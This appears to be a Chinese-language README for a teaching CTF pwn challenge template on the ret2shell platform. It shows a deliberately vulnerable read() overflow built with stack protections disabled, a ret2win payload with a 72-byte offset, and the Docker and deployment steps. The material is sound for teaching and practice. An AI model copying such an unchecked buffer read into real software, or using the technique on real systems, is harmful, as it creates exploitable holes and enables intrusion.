# pwn — 一个最小的 ret2win 题目（ret2shell 容器化模板）

给 [ret2shell](https://github.com/ret2shell/ret2shell) 用的最小 Pwn 题样例：`read()` 溢出 64 字节缓冲区，
覆盖返回地址跳进 `win()` 读 `/flag`。关闭了 canary 和 PIE，保留 NX，所以只能 ret2win 不能 shellcode。

## 目录结构

```
.
├── Dockerfile              # 两阶段构建：debian:bookworm 编译，slim + socat 运行
├── src/
│   ├── vuln.c              # 题目源码
│   └── Makefile            # -fno-stack-protector -no-pie -fcf-protection=none
├── docker/entrypoint.sh    # $FLAG -> /flag，socat 监听 9999
├── deploy/
│   ├── env.toml            # ret2shell 题目环境（Pwn: tcp + raw）
│   └── checker/main.rx     # 按用户生成 flag + 判题
├── solve/exp.py            # pwntools 利用脚本
└── README.md
```

## 本地构建与自测

```bash
docker build -t pwn-ret2win:latest .

docker run --rm -d --name pwn-test -p 9999:9999 \
  -e FLAG='flag{local_test_flag}' pwn-ret2win:latest

nc 127.0.0.1 9999
# payload>
```

编译产物在镜像内 `/pwn/vuln`，需要本地调试时可以：

```bash
docker create --name pwn-x pwn-ret2win:latest
docker cp pwn-x:/pwn/vuln ./vuln
docker rm pwn-x
python3 solve/exp.py --local ./vuln
```

## 漏洞与利用

```c
char buf[64];
read(0, buf, 0x200);   // 可写 512 字节
```

栈布局：`buf[64]` + `saved rbp[8]` → 返回地址偏移 **72**。

```
payload = b"A" * 72 + p64(elf.symbols["win"])
```

`win()` 会 `fopen("/flag")` 并打印内容。flag 由平台按用户注入到环境变量 `FLAG`，
容器 entrypoint 再落到 `/flag`（owner `pwn`，mode 400），所以进程以 `pwn` 身份运行时才能读到。

## 接到 ret2shell 上

1. **构建并上传镜像**：本地 `docker save pwn-ret2win:latest -o pwn.tar`，
   后台「比赛 → 镜像 → 上传」，得到 `registry:5000/<比赛bucket>/pwn:<时间戳>`。
2. **配置环境**：把 `deploy/env.toml` 复制到比赛仓库 `challenges/pwn1/env.toml`，
   把 `tag` 换成上一步的地址（`port = 9999`、`protocol = "tcp"`、`app_protocol = "raw"`）。
3. **判题脚本**：把 `deploy/checker/main.rx` 复制到 `challenges/pwn1/checker/main.rx`。
4. **启动实例**：题目页点「启动靶机」，实例信息会给出 `172.26.50.78:<NodePort>`。
5. **验证**：`python3 solve/exp.py --host 172.26.50.78 --port <NodePort>`，输出 `flag{ret2win_<账号>}`。

> 平台侧要点：题目必须挂到配置了 K8s 集群的实例上；每个用户同时只能开 1 个实例；
> `internet = false` 时 Pod 完全不能出网（连 DNS 都不通），本题目不需要出网。

## License

仅用于教学与自有 CTF 平台演示。
